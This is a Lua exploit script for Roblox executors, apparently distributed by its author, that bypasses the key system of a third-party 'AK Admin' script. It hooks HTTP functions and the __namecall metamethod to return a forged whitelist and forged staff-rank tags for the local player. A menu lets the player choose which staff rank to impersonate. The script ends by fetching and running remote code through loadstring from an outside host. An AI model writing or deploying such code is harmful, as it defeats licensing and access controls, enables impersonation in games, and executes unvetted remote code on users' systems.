local HOOK_CAPABLE = { potassium = true, volt = true, wave = true, medium = true, madium = true }

local function detectExecutor()
    local name = ""
    pcall(function() if identifyexecutor then name = (identifyexecutor()) or "" end end)
    return tostring(name):lower()
end

local execName = detectExecutor()
local useHookPath = false
for k in pairs(HOOK_CAPABLE) do
    if execName:find(k, 1, true) then useHookPath = true; break end
end

print(("[spoof] executor=%q  mode=%s"):format(execName, useHookPath and "HOOK" or "PATCH"))

local Players      = game:GetService("Players")
local CoreGui      = game:GetService("CoreGui")
local HttpService  = game:GetService("HttpService")
local GroupService = game:GetService("GroupService")
local myName       = Players.LocalPlayer.Name

local fakeWhitelist = '{"users":["' .. myName .. '","SAYROX","LOVESYALL"]}'

local function isWL(url) return type(url) == "string" and url:lower():find("whitelist", 1, true) ~= nil end

if useHookPath then
    local hookfunction   = hookfunction or replaceclosure or detour_function
    local hookmetamethod = hookmetamethod
    local newcclosure    = newcclosure or function(f) return f end
    local getgenv        = getgenv or function() return _G end

    if hookfunction then
        pcall(function()
            local orig
            orig = hookfunction(GroupService.PromptJoinAsync, newcclosure(function(self, ...)
                pcall(orig, self, ...)
            end))
        end)
    end

    pcall(function() _G.AK_ADMIN_EXECUTED = nil end)
    pcall(function() getgenv().AK_ADMIN_EXECUTED = nil end)

    local PRIORITY = {
        "AK OWNER", "AK CO OWNER", "STAFF-MANAGER", "AK STAFF",
        "AK SUPPORT", "AK BOOSTER", "CONTENT CREATOR",
    }
    local PRIORITY_SET = {}
    for _, r in ipairs(PRIORITY) do PRIORITY_SET[r] = true end

    local FALLBACK = {}
    for _, r in ipairs(PRIORITY) do table.insert(FALLBACK, r) end

    local fetched = {}
    local ok, body = pcall(function()
        return game:HttpGet("https://absent.wtf/Mains/Tags.json")
    end)
    if ok and type(body) == "string" then
        pcall(function()
            local data = HttpService:JSONDecode(body)
            for k, v in pairs(data) do
                if type(v) == "table" and k ~= "BOOSTER_MAPPING" then
                    table.insert(fetched, k)
                end
            end
        end)
    end
    if #fetched == 0 then fetched = FALLBACK end

    local extras = {}
    for _, r in ipairs(fetched) do
        if not PRIORITY_SET[r] then table.insert(extras, r) end
    end
    table.sort(extras, function(a, b) return a:lower() < b:lower() end)

    local RANKS = {}
    local fetchedSet = {}
    for _, r in ipairs(fetched) do fetchedSet[r] = true end
    for _, r in ipairs(PRIORITY) do
        if fetchedSet[r] then table.insert(RANKS, r) end
    end
    for _, r in ipairs(extras) do table.insert(RANKS, r) end

    local selected = nil
    local selectedFlag = false

    local gui = Instance.new("ScreenGui")
    gui.Name = "RankSelector"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui") end

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.4
    bg.BorderSizePixel = 0

    local panel = Instance.new("Frame", bg)
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Position = UDim2.fromScale(0.5, 0.5)
    panel.Size = UDim2.fromOffset(360, 480)
    panel.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    panel.BorderSizePixel = 0
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)

    local title = Instance.new("TextLabel", panel)
    title.Size = UDim2.new(1, 0, 0, 36)
    title.BackgroundTransparency = 1
    title.Text = "Pick your rank"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(255, 255, 255)

    local sub = Instance.new("TextLabel", panel)
    sub.Position = UDim2.fromOffset(0, 36)
    sub.Size = UDim2.new(1, 0, 0, 18)
    sub.BackgroundTransparency = 1
    sub.Text = myName .. "   |   " .. #RANKS .. " ranks"
    sub.Font = Enum.Font.Gotham
    sub.TextSize = 12
    sub.TextColor3 = Color3.fromRGB(170, 170, 180)

    local searchBox = Instance.new("TextBox", panel)
    searchBox.Position = UDim2.fromOffset(10, 62)
    searchBox.Size = UDim2.new(1, -20, 0, 32)
    searchBox.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
    searchBox.BorderSizePixel = 0
    searchBox.PlaceholderText = "Search ranks..."
    searchBox.Text = ""
    searchBox.Font = Enum.Font.Gotham
    searchBox.TextSize = 13
    searchBox.TextColor3 = Color3.fromRGB(240, 240, 240)
    searchBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
    searchBox.ClearTextOnFocus = false
    searchBox.TextXAlignment = Enum.TextXAlignment.Left
    local sbPad = Instance.new("UIPadding", searchBox)
    sbPad.PaddingLeft = UDim.new(0, 10)
    sbPad.PaddingRight = UDim.new(0, 10)
    Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 6)

    local scroll = Instance.new("ScrollingFrame", panel)
    scroll.Position = UDim2.fromOffset(10, 104)
    scroll.Size = UDim2.new(1, -20, 1, -114)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.CanvasSize = UDim2.fromOffset(0, 0)

    local layout = Instance.new("UIListLayout", scroll)
    layout.Padding = UDim.new(0, 4)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    local buttons = {}
    for i, rankName in ipairs(RANKS) do
        local btn = Instance.new("TextButton", scroll)
        btn.Size = UDim2.new(1, -8, 0, 34)
        btn.LayoutOrder = i
        btn.BackgroundColor3 = PRIORITY_SET[rankName]
            and Color3.fromRGB(60, 50, 80)
            or  Color3.fromRGB(45, 45, 55)
        btn.BorderSizePixel = 0
        btn.Text = rankName
        btn.Font = PRIORITY_SET[rankName] and Enum.Font.GothamBold or Enum.Font.GothamMedium
        btn.TextSize = 14
        btn.TextColor3 = Color3.fromRGB(240, 240, 240)
        btn.AutoButtonColor = true
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function()
            selected = rankName
            selectedFlag = true
        end)
        table.insert(buttons, { btn = btn, name = rankName:lower() })
    end

    local function updateCanvas()
        local h = 0
        for _, b in ipairs(buttons) do
            if b.btn.Visible then h = h + 38 end
        end
        scroll.CanvasSize = UDim2.fromOffset(0, h)
    end

    local function applyFilter()
        local q = searchBox.Text:lower()
        for _, b in ipairs(buttons) do
            b.btn.Visible = (q == "" or b.name:find(q, 1, true) ~= nil)
        end
        updateCanvas()
    end

    searchBox:GetPropertyChangedSignal("Text"):Connect(applyFilter)
    applyFilter()

    while not selectedFlag do task.wait(0.1) end
    gui:Destroy()

    local tagsTable = {}
    for _, r in ipairs(RANKS) do tagsTable[r] = {} end
    tagsTable[selected] = { myName }
    tagsTable["BOOSTER_MAPPING"] = {}
    local fakeTags = HttpService:JSONEncode(tagsTable)

    local function isTags(url) return type(url) == "string" and url:find("Tags%.json") ~= nil end
    local function spoofFor(url)
        if isWL(url)   then return fakeWhitelist, "application/json" end
        if isTags(url) then return fakeTags, "application/json" end
    end

    pcall(function()
        local orig
        orig = hookfunction(game.HttpGet, newcclosure(function(self, url, ...)
            local s = spoofFor(url); if s then return s end
            return orig(self, url, ...)
        end))
    end)

    pcall(function()
        local orig
        orig = hookfunction(game.HttpGetAsync, newcclosure(function(self, url, ...)
            local s = spoofFor(url); if s then return s end
            return orig(self, url, ...)
        end))
    end)

    pcall(function()
        if not hookmetamethod then return end
        local origNamecall
        origNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            local method = getnamecallmethod and getnamecallmethod() or ""
            if method == "HttpGet" or method == "HttpGetAsync" or method == "GetAsync" then
                local args = {...}
                local s = spoofFor(args[1]); if s then return s end
            end
            return origNamecall(self, ...)
        end))
    end)

    local function wrap(orig)
        return newcclosure(function(opts)
            local s, ctype = spoofFor(opts.Url or opts.url or "")
            if s then
                return { Body = s, StatusCode = 200, Success = true,
                         Headers = { ["Content-Type"] = ctype or "application/json" } }
            end
            return orig(opts)
        end)
    end
    pcall(function() if syn and syn.request   then syn.request   = wrap(syn.request)   end end)
    pcall(function() if http and http.request then http.request  = wrap(http.request)  end end)
    pcall(function() if http_request          then getgenv().http_request = wrap(http_request) end end)
    pcall(function() if request               then getgenv().request      = wrap(request)      end end)

    print("Spoofing " .. myName .. " as " .. selected .. " [hook mode]")
	print("Loading AK Admin.")
    print("Sayrox Strikes again:>")
    print("Key system got bummed")
    print("Enjoy<3")

    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
    end)
    if not ok then warn("[spoof] loader error: " .. tostring(err)) end
    return
end

local function spoofForPatch(url)
    if isWL(url) then return fakeWhitelist, "application/json" end
end

if request then
    local __origReq = request
    local wrapped = function(opts)
        local s, ctype = spoofForPatch((opts and (opts.Url or opts.url)) or "")
        if s then
            return { Body = s, StatusCode = 200, Success = true,
                     Headers = { ["Content-Type"] = ctype or "application/json" } }
        end
        return __origReq(opts)
    end
    request = wrapped
    pcall(function() _G.request = wrapped end)
end

print(myName .. " Key sys fucked [Bad executor version]")
print("Loading AK Admin.")
print("Sayrox Strikes again:>")
print("Key system got bummed")
print("Enjoy<3")


local ok, err = pcall(function()
    loadstring(game:HttpGet("https://absent.wtf/AKADMIN.lua"))()
end)
if not ok then warn("[spoof] loader error: " .. tostring(err)) end



--- sayrox_o on discord if u need help or found a bug<3 ---
